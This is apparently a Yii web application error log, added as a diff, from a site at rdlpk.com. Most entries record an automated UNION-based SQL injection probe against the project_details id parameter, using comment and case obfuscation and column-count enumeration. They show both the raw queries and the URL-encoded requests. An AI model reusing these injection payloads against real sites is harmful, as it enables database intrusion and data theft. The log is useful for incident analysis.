+2019/05/01 11:39:06 [error] [exception.CDbException] exception 'CDbException' with message 'CDbCommand failed to execute the SQL statement: SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns. The SQL statement executed was: SELECT * from projects WHERE id='1999999.9' /**/uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39,0x393133353134353632372e39 and '0'='0'' in /home/rdlpk/public_html/framework/db/CDbCommand.php:543
+Stack trace:
+#0 /home/rdlpk/public_html/framework/db/CDbCommand.php(377): CDbCommand->queryInternal('', 0, Array)
+#1 /home/rdlpk/public_html/protected/controllers/WebController.php(1175): CDbCommand->query()
+#2 /home/rdlpk/public_html/framework/web/actions/CInlineAction.php(49): WebController->actionProject_details()
+#3 /home/rdlpk/public_html/framework/web/CController.php(308): CInlineAction->runWithParams(Array)
+#4 /home/rdlpk/public_html/framework/web/CController.php(286): CController->runAction(Object(CInlineAction))
+#5 /home/rdlpk/public_html/framework/web/CController.php(265): CController->runActionWithFilters(Object(CInlineAction), Array)
+#6 /home/rdlpk/public_html/framework/web/CWebApplication.php(282): CController->run('project_details')
+#7 /home/rdlpk/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('web/project_det...')
+#8 /home/rdlpk/public_html/framework/base/CApplication.php(180): CWebApplication->processRequest()
+#9 /home/rdlpk/public_html/index.php(13): CApplication->run()
+#10 {main}
+REQUEST_URI=/index.php/web/project_details?id=1999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39,0x393133353134353632372e39+and+'0'='0
+HTTP_REFERER=http://www.rdlpk.com/index.php/web/project_details?id=1999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39,0x393133353134353632372e39+and+'0'='0
+---
+2019/05/01 11:39:07 [error] [system.db.CDbCommand] CDbCommand::() failed: SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns. The SQL statement executed was: SELECT * from projects WHERE id='1999999.9' /**/uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39,0x393133353134353632372e39,0x393133353134353632382e39 and '0'='0'.
+in /home/rdlpk/public_html/protected/controllers/WebController.php (1175)
+in /home/rdlpk/public_html/index.php (13)
+2019/05/01 11:39:07 [error] [exception.CDbException] exception 'CDbException' with message 'CDbCommand failed to execute the SQL statement: SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns. The SQL statement executed was: SELECT * from projects WHERE id='1999999.9' /**/uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39,0x393133353134353632372e39,0x393133353134353632382e39 and '0'='0'' in /home/rdlpk/public_html/framework/db/CDbCommand.php:543
+Stack trace:
+#0 /home/rdlpk/public_html/framework/db/CDbCommand.php(377): CDbCommand->queryInternal('', 0, Array)
+#1 /home/rdlpk/public_html/protected/controllers/WebController.php(1175): CDbCommand->query()
+#2 /home/rdlpk/public_html/framework/web/actions/CInlineAction.php(49): WebController->actionProject_details()
+#3 /home/rdlpk/public_html/framework/web/CController.php(308): CInlineAction->runWithParams(Array)
+#4 /home/rdlpk/public_html/framework/web/CController.php(286): CController->runAction(Object(CInlineAction))
+#5 /home/rdlpk/public_html/framework/web/CController.php(265): CController->runActionWithFilters(Object(CInlineAction), Array)
+#6 /home/rdlpk/public_html/framework/web/CWebApplication.php(282): CController->run('project_details')
+#7 /home/rdlpk/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('web/project_det...')
+#8 /home/rdlpk/public_html/framework/base/CApplication.php(180): CWebApplication->processRequest()
+#9 /home/rdlpk/public_html/index.php(13): CApplication->run()
+#10 {main}
+REQUEST_URI=/index.php/web/project_details?id=1999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39,0x393133353134353632372e39,0x393133353134353632382e39+and+'0'='0
+HTTP_REFERER=http://www.rdlpk.com/index.php/web/project_details?id=1999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39,0x393133353134353632372e39,0x393133353134353632382e39+and+'0'='0
+---
+2019/05/01 11:39:08 [error] [system.db.CDbCommand] CDbCommand::() failed: SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns. The SQL statement executed was: SELECT * from projects WHERE id='1999999.9' /**/uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39,0x393133353134353632372e39,0x393133353134353632382e39,0x393133353134353632392e39 and '0'='0'.
+in /home/rdlpk/public_html/protected/controllers/WebController.php (1175)
+in /home/rdlpk/public_html/index.php (13)
+2019/05/01 11:39:08 [error] [exception.CDbException] exception 'CDbException' with message 'CDbCommand failed to execute the SQL statement: SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns. The SQL statement executed was: SELECT * from projects WHERE id='1999999.9' /**/uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39,0x393133353134353632372e39,0x393133353134353632382e39,0x393133353134353632392e39 and '0'='0'' in /home/rdlpk/public_html/framework/db/CDbCommand.php:543
+Stack trace:
+#0 /home/rdlpk/public_html/framework/db/CDbCommand.php(377): CDbCommand->queryInternal('', 0, Array)
+#1 /home/rdlpk/public_html/protected/controllers/WebController.php(1175): CDbCommand->query()
+#2 /home/rdlpk/public_html/framework/web/actions/CInlineAction.php(49): WebController->actionProject_details()
+#3 /home/rdlpk/public_html/framework/web/CController.php(308): CInlineAction->runWithParams(Array)
+#4 /home/rdlpk/public_html/framework/web/CController.php(286): CController->runAction(Object(CInlineAction))
+#5 /home/rdlpk/public_html/framework/web/CController.php(265): CController->runActionWithFilters(Object(CInlineAction), Array)
+#6 /home/rdlpk/public_html/framework/web/CWebApplication.php(282): CController->run('project_details')
+#7 /home/rdlpk/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('web/project_det...')
+#8 /home/rdlpk/public_html/framework/base/CApplication.php(180): CWebApplication->processRequest()
+#9 /home/rdlpk/public_html/index.php(13): CApplication->run()
+#10 {main}
+REQUEST_URI=/index.php/web/project_details?id=1999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39,0x393133353134353632372e39,0x393133353134353632382e39,0x393133353134353632392e39+and+'0'='0
+HTTP_REFERER=http://www.rdlpk.com/index.php/web/project_details?id=1999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39,0x393133353134353632372e39,0x393133353134353632382e39,0x393133353134353632392e39+and+'0'='0
+---
+2019/05/01 11:39:08 [error] [system.db.CDbCommand] CDbCommand::() failed: SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns. The SQL statement executed was: SELECT * from projects WHERE id='1999999.9' /**/uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39,0x393133353134353632372e39,0x393133353134353632382e39,0x393133353134353632392e39,0x39313335313435363231302e39 and '0'='0'.
+in /home/rdlpk/public_html/protected/controllers/WebController.php (1175)
+in /home/rdlpk/public_html/index.php (13)
+2019/05/01 11:39:08 [error] [exception.CDbException] exception 'CDbException' with message 'CDbCommand failed to execute the SQL statement: SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns. The SQL statement executed was: SELECT * from projects WHERE id='1999999.9' /**/uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39,0x393133353134353632372e39,0x393133353134353632382e39,0x393133353134353632392e39,0x39313335313435363231302e39 and '0'='0'' in /home/rdlpk/public_html/framework/db/CDbCommand.php:543
+Stack trace:
+#0 /home/rdlpk/public_html/framework/db/CDbCommand.php(377): CDbCommand->queryInternal('', 0, Array)
+#1 /home/rdlpk/public_html/protected/controllers/WebController.php(1175): CDbCommand->query()
+#2 /home/rdlpk/public_html/framework/web/actions/CInlineAction.php(49): WebController->actionProject_details()
+#3 /home/rdlpk/public_html/framework/web/CController.php(308): CInlineAction->runWithParams(Array)
+#4 /home/rdlpk/public_html/framework/web/CController.php(286): CController->runAction(Object(CInlineAction))
+#5 /home/rdlpk/public_html/framework/web/CController.php(265): CController->runActionWithFilters(Object(CInlineAction), Array)
+#6 /home/rdlpk/public_html/framework/web/CWebApplication.php(282): CController->run('project_details')
+#7 /home/rdlpk/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('web/project_det...')
+#8 /home/rdlpk/public_html/framework/base/CApplication.php(180): CWebApplication->processRequest()
+#9 /home/rdlpk/public_html/index.php(13): CApplication->run()
+#10 {main}
+REQUEST_URI=/index.php/web/project_details?id=1999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39,0x393133353134353632372e39,0x393133353134353632382e39,0x393133353134353632392e39,0x39313335313435363231302e39+and+'0'='0
+HTTP_REFERER=http://www.rdlpk.com/index.php/web/project_details?id=1999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39,0x393133353134353632372e39,0x393133353134353632382e39,0x393133353134353632392e39,0x39313335313435363231302e39+and+'0'='0
+---
+2019/05/01 11:39:09 [error] [system.db.CDbCommand] CDbCommand::() failed: SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns. The SQL statement executed was: SELECT * from projects WHERE id='1999999.9' /**/uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39,0x393133353134353632372e39,0x393133353134353632382e39,0x393133353134353632392e39,0x39313335313435363231302e39,0x39313335313435363231312e39 and '0'='0'.
+in /home/rdlpk/public_html/protected/controllers/WebController.php (1175)
+in /home/rdlpk/public_html/index.php (13)
+2019/05/01 11:39:09 [error] [exception.CDbException] exception 'CDbException' with message 'CDbCommand failed to execute the SQL statement: SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns. The SQL statement executed was: SELECT * from projects WHERE id='1999999.9' /**/uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39,0x393133353134353632372e39,0x393133353134353632382e39,0x393133353134353632392e39,0x39313335313435363231302e39,0x39313335313435363231312e39 and '0'='0'' in /home/rdlpk/public_html/framework/db/CDbCommand.php:543
+Stack trace:
+#0 /home/rdlpk/public_html/framework/db/CDbCommand.php(377): CDbCommand->queryInternal('', 0, Array)
+#1 /home/rdlpk/public_html/protected/controllers/WebController.php(1175): CDbCommand->query()
+#2 /home/rdlpk/public_html/framework/web/actions/CInlineAction.php(49): WebController->actionProject_details()
+#3 /home/rdlpk/public_html/framework/web/CController.php(308): CInlineAction->runWithParams(Array)
+#4 /home/rdlpk/public_html/framework/web/CController.php(286): CController->runAction(Object(CInlineAction))
+#5 /home/rdlpk/public_html/framework/web/CController.php(265): CController->runActionWithFilters(Object(CInlineAction), Array)
+#6 /home/rdlpk/public_html/framework/web/CWebApplication.php(282): CController->run('project_details')
+#7 /home/rdlpk/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('web/project_det...')
+#8 /home/rdlpk/public_html/framework/base/CApplication.php(180): CWebApplication->processRequest()
+#9 /home/rdlpk/public_html/index.php(13): CApplication->run()
+#10 {main}
+REQUEST_URI=/index.php/web/project_details?id=1999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39,0x393133353134353632372e39,0x393133353134353632382e39,0x393133353134353632392e39,0x39313335313435363231302e39,0x39313335313435363231312e39+and+'0'='0
+HTTP_REFERER=http://www.rdlpk.com/index.php/web/project_details?id=1999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39,0x393133353134353632372e39,0x393133353134353632382e39,0x393133353134353632392e39,0x39313335313435363231302e39,0x39313335313435363231312e39+and+'0'='0
+---
+2019/05/01 11:39:09 [error] [system.db.CDbCommand] CDbCommand::() failed: SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns. The SQL statement executed was: SELECT * from projects WHERE id='1999999.9' /**/uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39,0x393133353134353632372e39,0x393133353134353632382e39,0x393133353134353632392e39,0x39313335313435363231302e39,0x39313335313435363231312e39,0x39313335313435363231322e39 and '0'='0'.
+in /home/rdlpk/public_html/protected/controllers/WebController.php (1175)
+in /home/rdlpk/public_html/index.php (13)
+2019/05/01 11:39:09 [error] [exception.CDbException] exception 'CDbException' with message 'CDbCommand failed to execute the SQL statement: SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns. The SQL statement executed was: SELECT * from projects WHERE id='1999999.9' /**/uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39,0x393133353134353632372e39,0x393133353134353632382e39,0x393133353134353632392e39,0x39313335313435363231302e39,0x39313335313435363231312e39,0x39313335313435363231322e39 and '0'='0'' in /home/rdlpk/public_html/framework/db/CDbCommand.php:543
+Stack trace:
+#0 /home/rdlpk/public_html/framework/db/CDbCommand.php(377): CDbCommand->queryInternal('', 0, Array)
+#1 /home/rdlpk/public_html/protected/controllers/WebController.php(1175): CDbCommand->query()
+#2 /home/rdlpk/public_html/framework/web/actions/CInlineAction.php(49): WebController->actionProject_details()
+#3 /home/rdlpk/public_html/framework/web/CController.php(308): CInlineAction->runWithParams(Array)
+#4 /home/rdlpk/public_html/framework/web/CController.php(286): CController->runAction(Object(CInlineAction))
+#5 /home/rdlpk/public_html/framework/web/CController.php(265): CController->runActionWithFilters(Object(CInlineAction), Array)
+#6 /home/rdlpk/public_html/framework/web/CWebApplication.php(282): CController->run('project_details')
+#7 /home/rdlpk/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('web/project_det...')
+#8 /home/rdlpk/public_html/framework/base/CApplication.php(180): CWebApplication->processRequest()
+#9 /home/rdlpk/public_html/index.php(13): CApplication->run()
+#10 {main}
+REQUEST_URI=/index.php/web/project_details?id=1999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39,0x393133353134353632372e39,0x393133353134353632382e39,0x393133353134353632392e39,0x39313335313435363231302e39,0x39313335313435363231312e39,0x39313335313435363231322e39+and+'0'='0
+HTTP_REFERER=http://www.rdlpk.com/index.php/web/project_details?id=1999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39,0x393133353134353632372e39,0x393133353134353632382e39,0x393133353134353632392e39,0x39313335313435363231302e39,0x39313335313435363231312e39,0x39313335313435363231322e39+and+'0'='0
+---
+2019/05/01 19:47:14 [error] [exception.CException] exception 'CException' with message 'FormsController cannot find the requested view "index".' in /home/rdlpk/public_html/framework/web/CController.php:878
+Stack trace:
+#0 /home/rdlpk/public_html/framework/web/CController.php(782): CController->renderPartial('index', NULL, true)
+#1 /home/rdlpk/public_html/protected/controllers/FormsController.php(4892): CController->render('index')
+#2 /home/rdlpk/public_html/framework/web/actions/CInlineAction.php(49): FormsController->actionIndex()
+#3 /home/rdlpk/public_html/framework/web/CController.php(308): CInlineAction->runWithParams(Array)
+#4 /home/rdlpk/public_html/framework/web/CController.php(286): CController->runAction(Object(CInlineAction))
+#5 /home/rdlpk/public_html/framework/web/CController.php(265): CController->runActionWithFilters(Object(CInlineAction), Array)
+#6 /home/rdlpk/public_html/framework/web/CWebApplication.php(282): CController->run('index')
+#7 /home/rdlpk/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('forms/index')
+#8 /home/rdlpk/public_html/framework/base/CApplication.php(180): CWebApplication->processRequest()
+#9 /home/rdlpk/public_html/index.php(13): CApplication->run()
+#10 {main}
+REQUEST_URI=/index.php/forms/index
+---
